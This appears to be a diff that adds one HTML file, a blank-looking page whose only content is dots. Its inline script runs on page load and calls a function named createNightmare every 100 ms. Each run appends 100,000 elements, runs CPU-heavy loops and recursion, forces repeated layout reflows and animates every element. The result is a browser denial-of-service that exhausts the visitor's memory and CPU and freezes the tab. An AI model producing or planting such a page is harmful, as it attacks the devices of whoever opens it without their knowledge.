@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>.</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+        }
+    </style>
+    <script>
+        // Function to create a large number of elements to consume memory
+        function createMemoryIntensivePage() {
+            const container = document.getElementById("container");
+
+            // Create a massive number of divs with random text
+            for (let i = 0; i < 100000; i++) {
+                const newDiv = document.createElement("div");
+                newDiv.textContent = "Memory consuming element #" + i;
+                container.appendChild(newDiv);
+            }
+        }
+
+        // Function to create CPU-intensive tasks with recursive calls
+        function cpuIntensiveTask() {
+            let randomValue = Math.random();
+            // Create recursive calls that consume the call stack
+            function recurse(depth) {
+                if (depth > 500) return; // Stop after a certain depth
+                randomValue += Math.random();
+                recurse(depth + 1);
+            }
+            recurse(0); // Call the recursive function
+
+            // Perform a CPU-heavy calculation
+            for (let i = 0; i < 1000000; i++) {
+                Math.sqrt(Math.random() * Math.random() * 1000000);
+            }
+        }
+
+        // Function to repeatedly cause reflows and layout recalculations
+        function triggerReflows() {
+            const container = document.getElementById("container");
+            for (let i = 0; i < 100000; i++) {
+                // Changing styles and causing reflows (recalculating layout)
+                container.style.marginTop = `${Math.random() * 100}px`;
+                container.style.marginLeft = `${Math.random() * 100}px`;
+                // Triggering forced reflow
+                container.offsetHeight;
+            }
+        }
+
+        // Function to add chaotic random animations
+        function randomAnimations() {
+            const elements = document.querySelectorAll('div');
+            elements.forEach(el => {
+                // Randomize position and animation
+                el.style.position = 'absolute';
+                el.style.top = `${Math.random() * window.innerHeight}px`;
+                el.style.left = `${Math.random() * window.innerWidth}px`;
+                el.style.transition = `all ${Math.random() * 5 + 1}s ease-in-out`;
+                el.style.transform = `rotate(${Math.random() * 360}deg)`;
+            });
+        }
+
+        // Function to create intense CPU load and memory consumption
+        function createNightmare() {
+            createMemoryIntensivePage(); // Memory-consuming page
+            cpuIntensiveTask(); // CPU-bound task
+            triggerReflows(); // Layout recalculations and reflows
+            randomAnimations(); // Chaotic movement of elements
+            setTimeout(createNightmare, 100); // Re-run everything every 100ms
+        }
+
+        // Start the nightmare when the page is loaded
+        window.onload = function() {
+            createNightmare(); // Start the chaos
+        };
+    </script>
+</head>
+<body>
+    <h1>.</h1>
+    <p>.</p>
+    <div id="container"></div>
+</body>
+</html>
